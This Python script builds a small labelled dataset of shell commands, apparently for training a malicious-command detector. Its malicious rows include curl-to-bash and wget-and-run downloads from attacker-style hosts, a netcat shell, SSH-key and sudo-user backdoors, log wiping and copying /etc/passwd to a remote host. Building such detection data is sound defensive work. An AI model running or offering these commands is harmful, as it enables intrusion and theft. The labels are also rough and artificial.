import csv

# label: 0 = benign, 1 = malicious/suspicious
data = [
    # Malicious / attacker-typical commands
    ("wget http://185.220.101.5/x86 -O /tmp/x86", 1),
    ("curl -s http://malicious.site/payload.sh | bash", 1),
    ("chmod +x /tmp/x86 && /tmp/x86", 1),
    ("echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys", 1),
    ("crontab -l; echo '* * * * * curl evil.com|bash' | crontab -", 1),
    ("rm -rf /var/log/*", 1),
    ("history -c && export HISTSIZE=0", 1),
    ("cat /etc/passwd", 1),
    ("uname -a && cat /proc/cpuinfo", 1),
    ("nc -lvp 4444 -e /bin/bash", 1),
    ("python3 -c 'import socket,os,pty;s=socket.socket()'", 1),
    ("apt-get install -y nmap masscan", 1),
    ("sudo su -", 1),
    ("chmod 777 /etc/shadow", 1),
    ("wget http://45.9.20.11/miner -O /tmp/m && chmod +x /tmp/m && ./m", 1),
    ("passwd root", 1),
    ("useradd -m hacker && usermod -aG sudo hacker", 1),
    ("iptables -F", 1),
    ("scp /etc/passwd attacker@remote:/tmp/", 1),
    ("curl ifconfig.me", 1),

    # Benign commands
    ("ls -la", 0),
    ("cd /home/user", 0),
    ("pwd", 0),
    ("whoami", 0),
    ("cat readme.txt", 0),
    ("mkdir test_folder", 0),
    ("touch file.txt", 0),
    ("df -h", 0),
    ("top", 0),
    ("ps aux", 0),
    ("echo hello world", 0),
    ("date", 0),
    ("uptime", 0),
    ("man ls", 0),
    ("clear", 0),
    ("exit", 0),
    ("vi notes.txt", 0),
    ("history", 0),
    ("ping -c 4 google.com", 0),
    ("free -m", 0),
]

with open("training_data.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["command", "label"])
    writer.writerows(data)

print(f"Wrote {len(data)} rows to training_data.csv")
